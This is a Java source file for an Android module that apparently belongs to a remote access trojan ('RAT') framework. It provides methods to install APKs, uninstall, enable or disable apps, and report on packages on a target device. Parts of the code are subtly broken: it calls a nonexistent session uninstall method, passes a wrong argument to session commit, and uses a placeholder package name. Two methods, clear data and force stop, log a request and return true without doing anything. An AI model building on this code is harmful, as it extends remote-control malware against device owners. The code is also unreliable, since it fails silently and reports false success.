package com.security.test.rat.modules.control;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

/**
 * AppControlModule - Implements advanced application control
 * 
 * Features:
 * - Install applications from APK files
 * - Uninstall applications
 * - Enable/disable applications
 * - Clear application data
 * - Force stop applications
 * - Manage app permissions
 */
public class AppControlModule extends RATModule {
    
    private static final String TAG = "AppControlModule";
    
    private Context context;
    private PackageManager packageManager;
    private boolean isInitialized = false;
    
    public AppControlModule(Context context) {
        super("AppControlModule", "Advanced application control and management");
        this.context = context;
    }
    
    @Override
    public boolean initialize() {
        try {
            Log.i(TAG, "Initializing AppControlModule");
            
            // Initialize package manager
            packageManager = context.getPackageManager();
            if (packageManager == null) {
                Log.e(TAG, "Package manager not available");
                return false;
            }
            
            isInitialized = true;
            Log.i(TAG, "AppControlModule initialized successfully");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize AppControlModule", e);
            return false;
        }
    }
    
    @Override
    public void cleanup() {
        try {
            isInitialized = false;
            Log.i(TAG, "AppControlModule cleaned up");
            
        } catch (Exception e) {
            Log.e(TAG, "Error during AppControlModule cleanup", e);
        }
    }
    
    /**
     * Install application from APK file
     */
    public boolean installApplication(String apkPath) throws Exception {
        if (!isInitialized) {
            throw new Exception("AppControlModule not initialized");
        }
        
        try {
            Log.i(TAG, "Installing application from: " + apkPath);
            
            File apkFile = new File(apkPath);
            if (!apkFile.exists()) {
                throw new Exception("APK file not found: " + apkPath);
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                return installAppModern(apkFile);
            } else {
                return installAppLegacy(apkFile);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to install application: " + apkPath, e);
            throw e;
        }
    }
    
    /**
     * Install app using modern PackageInstaller API
     */
    private boolean installAppModern(File apkFile) throws Exception {
        try {
            PackageInstaller packageInstaller = packageManager.getPackageInstaller();
            
            // Create installation session
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            );
            params.setAppPackageName("com.example.app"); // Placeholder package name
            
            int sessionId = packageInstaller.createSession(params);
            PackageInstaller.Session session = packageInstaller.openSession(sessionId);
            
            // Copy APK to session
            try (InputStream in = new FileInputStream(apkFile);
                 OutputStream out = session.openWrite("package", 0, apkFile.length())) {
                
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
                session.fsync(out);
            }
            
            // Commit the session
            Intent intent = new Intent(context, AppInstallReceiver.class);
            intent.setAction("APP_INSTALL_COMPLETE");
            intent.putExtra("session_id", sessionId);
            
            session.commit(intent.getParcelableExtra(Intent.EXTRA_INTENT));
            session.close();
            
            Log.i(TAG, "App installation session created successfully");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to install app using modern API", e);
            throw e;
        }
    }
    
    /**
     * Install app using legacy Intent API
     */
    private boolean installAppLegacy(File apkFile) throws Exception {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            
            context.startActivity(intent);
            Log.i(TAG, "App installation intent sent (legacy method)");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to install app using legacy API", e);
            throw e;
        }
    }
    
    /**
     * Uninstall application
     */
    public boolean uninstallApplication(String packageName) throws Exception {
        if (!isInitialized) {
            throw new Exception("AppControlModule not initialized");
        }
        
        try {
            Log.i(TAG, "Uninstalling application: " + packageName);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                return uninstallAppModern(packageName);
            } else {
                return uninstallAppLegacy(packageName);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to uninstall application: " + packageName, e);
            throw e;
        }
    }
    
    /**
     * Uninstall app using modern PackageInstaller API
     */
    private boolean uninstallAppModern(String packageName) throws Exception {
        try {
            PackageInstaller packageInstaller = packageManager.getPackageInstaller();
            
            // Create uninstallation session
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            );
            
            int sessionId = packageInstaller.createSession(params);
            PackageInstaller.Session session = packageInstaller.openSession(sessionId);
            
            // Uninstall the package
            session.uninstall(packageName);
            
            // Commit the session
            Intent intent = new Intent(context, AppUninstallReceiver.class);
            intent.setAction("APP_UNINSTALL_COMPLETE");
            intent.putExtra("session_id", sessionId);
            intent.putExtra("package_name", packageName);
            
            session.commit(intent.getParcelableExtra(Intent.EXTRA_INTENT));
            session.close();
            
            Log.i(TAG, "App uninstallation session created successfully");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to uninstall app using modern API", e);
            throw e;
        }
    }
    
    /**
     * Uninstall app using legacy Intent API
     */
    private boolean uninstallAppLegacy(String packageName) throws Exception {
        try {
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(Uri.parse("package:" + packageName));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            
            context.startActivity(intent);
            Log.i(TAG, "App uninstallation intent sent (legacy method)");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to uninstall app using legacy API", e);
            throw e;
        }
    }
    
    /**
     * Enable application
     */
    public boolean enableApplication(String packageName) throws Exception {
        if (!isInitialized) {
            throw new Exception("AppControlModule not initialized");
        }
        
        try {
            Log.i(TAG, "Enabling application: " + packageName);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                packageManager.setApplicationEnabledSetting(
                    packageName,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    0
                );
                Log.i(TAG, "Application enabled successfully: " + packageName);
                return true;
            } else {
                Log.w(TAG, "Enabling applications not supported on this Android version");
                return false;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to enable application: " + packageName, e);
            throw e;
        }
    }
    
    /**
     * Disable application
     */
    public boolean disableApplication(String packageName) throws Exception {
        if (!isInitialized) {
            throw new Exception("AppControlModule not initialized");
        }
        
        try {
            Log.i(TAG, "Disabling application: " + packageName);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                packageManager.setApplicationEnabledSetting(
                    packageName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    0
                );
                Log.i(TAG, "Application disabled successfully: " + packageName);
                return true;
            } else {
                Log.w(TAG, "Disabling applications not supported on this Android version");
                return false;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to disable application: " + packageName, e);
            throw e;
        }
    }
    
    /**
     * Clear application data
     */
    public boolean clearApplicationData(String packageName) throws Exception {
        if (!isInitialized) {
            throw new Exception("AppControlModule not initialized");
        }
        
        try {
            Log.i(TAG, "Clearing application data: " + packageName);
            
            // This would require package manager permissions
            // For now, we'll log the attempt
            Log.i(TAG, "Application data clear requested for: " + packageName + " (requires package manager permissions)");
            
            // In a real implementation, you would use PackageManager.deleteApplicationDataFiles()
            // if (packageManager.hasSystemFeature(PackageManager.FEATURE_MANAGED_USERS)) {
            //     packageManager.deleteApplicationDataFiles(packageName, null);
            // }
            
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to clear application data: " + packageName, e);
            throw e;
        }
    }
    
    /**
     * Force stop application
     */
    public boolean forceStopApplication(String packageName) throws Exception {
        if (!isInitialized) {
            throw new Exception("AppControlModule not initialized");
        }
        
        try {
            Log.i(TAG, "Force stopping application: " + packageName);
            
            // This would require FORCE_STOP_PACKAGES permission
            // For now, we'll log the attempt
            Log.i(TAG, "Application force stop requested for: " + packageName + " (requires FORCE_STOP_PACKAGES permission)");
            
            // In a real implementation, you would use ActivityManager.forceStopPackage()
            // ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            // if (am != null) {
            //     am.forceStopPackage(packageName);
            // }
            
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to force stop application: " + packageName, e);
            throw e;
        }
    }
    
    /**
     * Get application installation status
     */
    public String getAppInstallStatus(String packageName) throws Exception {
        if (!isInitialized) {
            throw new Exception("AppControlModule not initialized");
        }
        
        try {
            JSONObject status = new JSONObject();
            
            try {
                packageManager.getPackageInfo(packageName, 0);
                status.put("installed", true);
                status.put("package_name", packageName);
                
                // Get additional info
                try {
                    android.content.pm.ApplicationInfo appInfo = packageManager.getApplicationInfo(packageName, 0);
                    status.put("enabled", appInfo.enabled);
                    status.put("source_dir", appInfo.sourceDir);
                    status.put("data_dir", appInfo.dataDir);
                } catch (Exception e) {
                    status.put("enabled", false);
                    status.put("error", "Could not get application info");
                }
                
            } catch (PackageManager.NameNotFoundException e) {
                status.put("installed", false);
                status.put("package_name", packageName);
                status.put("error", "Package not found");
            }
            
            return status.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to get app install status: " + packageName, e);
            throw e;
        }
    }
    
    /**
     * Get module status
     */
    public String getStatus() {
        if (!isInitialized) {
            return "Not initialized";
        }
        
        return "Ready - Advanced app control available";
    }
    
    /**
     * Broadcast receiver for app installation completion
     */
    public static class AppInstallReceiver extends android.content.BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            int sessionId = intent.getIntExtra("session_id", -1);
            int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE);
            
            if (status == PackageInstaller.STATUS_SUCCESS) {
                Log.i(TAG, "App installation completed successfully for session: " + sessionId);
            } else {
                String message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                Log.e(TAG, "App installation failed for session: " + sessionId + " - " + message);
            }
        }
    }
    
    /**
     * Broadcast receiver for app uninstallation completion
     */
    public static class AppUninstallReceiver extends android.content.BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            int sessionId = intent.getIntExtra("session_id", -1);
            String packageName = intent.getStringExtra("package_name");
            int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE);
            
            if (status == PackageInstaller.STATUS_SUCCESS) {
                Log.i(TAG, "App uninstallation completed successfully for package: " + packageName);
            } else {
                String message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                Log.e(TAG, "App uninstallation failed for package: " + packageName + " - " + message);
            }
        }
    }
}
